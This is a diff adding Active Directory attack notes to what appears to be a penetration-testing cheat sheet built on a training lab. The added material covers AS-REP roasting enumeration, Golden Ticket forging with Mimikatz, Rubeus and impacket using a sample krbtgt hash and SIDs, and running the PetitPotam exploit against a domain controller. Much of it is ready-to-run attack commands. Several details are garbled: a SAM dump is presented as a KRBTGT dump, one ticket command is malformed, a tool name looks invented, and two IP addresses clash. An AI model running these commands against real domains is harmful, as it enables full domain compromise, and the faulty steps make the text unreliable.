@@ -41,6 +41,10 @@ ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP 
 
 The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.
 
+Check if users in the domain that have the pre authentication not required:
+
+    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
 This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth.
 
 
@@ -49,6 +53,7 @@ This attack does not require any domain user context and can be done by just kno
 When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
 
     kerbrute userenum -d <domain_name> --dc <domain_controller_ip> <domain_usernames_list>.txt
+    kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 
 Or use impacket Get-NPUsers.py
 
@@ -90,6 +95,52 @@ Execute the attack:
     lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 
 We can than use the extracted hashes in: Pass-the-Hash (PtH) attacks, Golden Ticket attacks (with the krbtgt hash) and Access sensitive systems using admin accounts.
+
+## Golden Ticket
+
+A Golden Ticket attack is a type of attack in Microsoft Active Directory (AD) environments where an attacker forges a Kerberos ticket (TGT – Ticket Granting Ticket) to impersonate any user, typically a Domain Admin, within the Active Directory domain. This attack enables the attacker to gain unauthorized access to resources and escalate privileges, allowing them to move freely within the network.
+
+### How Golden Ticket Attacks Work:
+1. **KRBTGT Account:** The KRBTGT account is a special account used by the **Domain Controller (DC)** to encrypt and sign all Kerberos tickets. The NTLM hash of this account is a crucial part of the Golden Ticket attack.
+   
+2. **Attacker's Goal:** The attacker needs to gain access to the **KRBTGT NTLM hash**. This can be achieved through:
+   - **Dumping Active Directory hashes** using tools like **Mimikatz** or **Kerberos Exploitation (kerb2)**.
+   - **Compromising a Domain Controller** and extracting the hash directly from the DC.
+
+3. **Forging the Golden Ticket:**
+   - Once the attacker has the KRBTGT NTLM hash, they can use it to forge a **Golden Ticket**.
+   - The **Golden Ticket** is created with the attacker’s desired information, such as impersonating a **Domain Admin**.
+   - The ticket is forged using tools like **Mimikatz**, which takes the **KRBTGT hash**, the target user’s information, and creates a valid TGT.
+
+4. **Accessing Resources:** The forged TGT is then used by the attacker to request service tickets (TGS) for access to various resources, such as domain controllers, file shares, etc. The ticket is accepted by the KDC because it is signed using the KRBTGT account’s NTLM hash, making it appear legitimate.
+
+5. **Persistence:** The attacker can use the Golden Ticket for as long as they wish, provided the **KRBTGT password** is not changed. The attacker can maintain persistent access to the domain even if their original access is detected and revoked, until the KRBTGT password is reset.
+
+### Tools Used in Golden Ticket Attacks:
+
+- **Mimikatz:** A popular tool used for extracting the KRBTGT NTLM hash and forging Golden Tickets.
+- **Impacket:** A toolkit that includes tools to interact with Kerberos and perform attacks, such as forging tickets.
+- **Rubeus:** A powerful tool that can be used for Kerberos ticket extraction and manipulation, including creating Golden Tickets.
+
+### Execution
+
+First, dump the KRBTGT NTLM hash using Mimikatz:
+
+    mimikatz.exe "privilege::debug" "lsadump::sam" exit
+
+Use the extracted NTLM hash to create a Golden Ticket:
+
+    mimikatz.exe "kerberos::ptt /user:Administrator /rc4:<KRBTGT NTLM HASH> /domain:example.com /sid:<DOMAIN SID> /ticket:<BASE64 ENCODED TICKET>"
+    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+    or using rubeus
+
+    .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+    or using impacket
+
+    ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
 
 
 ## Kerberoasting
@@ -194,6 +245,62 @@ Kerberos does not require the user’s password hash to be stored or transmitted
 | **Time-Bound Authentication**    | Tickets expire                      | Hashes do not expire                   |
 | **Credential Storage**           | Minimal local storage               | Often stored locally and in memory     |
 
+
+
+## PetitPotam (MS-EFSRPC)
+
+PetitPotam is a critical vulnerability (CVE-2021-36942) that was discovered in Microsoft Windows' MS-EFSRPC (Microsoft Encrypting File System Remote Protocol), which is used for communication between Windows machines in an Active Directory environment. This vulnerability allows an attacker to escalate privileges or perform NTLM relay attacks by forcing a vulnerable Windows machine to authenticate to an attacker-controlled server, potentially allowing the attacker to gain administrative privileges.If MS-EFSRPC is exposed to the network and is vulnerable, it may be a vector for the attack.
+
+### Overview of PetitPotam (CVE-2021-36942)
+- **Vulnerability Type:** NTLM Relay / Authentication Bypass.
+- **Impact:** The vulnerability allows attackers to escalate privileges and potentially take over a Windows domain controller, leading to full domain compromise.
+- **Discovery Date:** July 2021.
+- **Affected Components:**
+  - MS-EFSRPC (Microsoft Encrypting File System Remote Protocol)
+  - Active Directory Domain Services (AD DS)
+  - Other services relying on NTLM authentication.
+
+### How PetitPotam Works:
+The vulnerability exists in the way Windows handles NTLM authentication during communication between systems in an Active Directory domain. Specifically, an attacker can use **MS-EFSRPC** to force a machine to authenticate with an attacker-controlled server. By leveraging the NTLM relay attack, an attacker can capture the authentication request and relay it to other machines or services, such as a **domain controller**.
+
+Here's a general breakdown of the attack flow:
+1. **MS-EFSRPC Vulnerability:** The attacker sends a specially crafted request to a vulnerable Windows system, triggering the system to use NTLM authentication for communication.
+2. **NTLM Relay Attack:** The attacker intercepts the NTLM authentication request and relays it to a target machine (e.g., a domain controller or another Windows machine) that will accept the authentication.
+3. **Privilege Escalation:** If successful, the attacker can gain administrative privileges on the target machine, which may include full control of the domain or other services.
+
+### Affected Versions:
+PetitPotam affects the following Windows versions and configurations:
+- **Windows Server** (including versions used in Active Directory environments).
+- **Windows 10** and other systems that may communicate with Windows Server.
+- Specifically, any system where MS-EFSRPC is exposed and NTLM authentication is used.
+
+### Attack Scenarios:
+1. **Domain Controller Compromise:**
+   - An attacker can relay authentication requests to a domain controller and potentially compromise the entire domain.
+2. **Privilege Escalation in AD Environments:**
+   - By targeting machines that are part of an Active Directory domain, attackers could escalate their privileges from a low-privileged user to an administrator or domain admin.
+
+### Execution
+
+Get the petitpotam git repo:
+
+    git clone https://github.com/topotam/PetitPotam.git
+
+Check for the vulnerability, by testing if MS-EFSRPC is accessible:
+
+    rpcclient -U "" -N <domain_controller_ip> -c "srvinfo"
+
+    or impacket's
+
+    rpcdump <domain_controller_ip>
+
+    or just run the petitpotam python script bellow
+
+
+Execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.255) and the target Domain Controller (172.16.5.5). 
+
+    python3 PetitPotam.py 172.16.5.225 172.16.5.5
+
 ## PrintNightmare
 
 PrintNightmare is a critical security vulnerability (CVE-2021-34527) discovered in the Windows Print Spooler service, which is responsible for managing print jobs on a Windows system. The vulnerability allows attackers to remotely execute code with system-level privileges, potentially leading to full system compromise.
@@ -257,7 +364,6 @@ Kerberos Unconstrained Delegation
 Kerberos Resource-Based Constrained Delegation (RBCD)
 
 
-PetitPotam (MS-EFSRPC)
 
 WriteOwner abused with Set-DomainObjectOwner
 WriteDACL abused with Add-DomainObjectACL
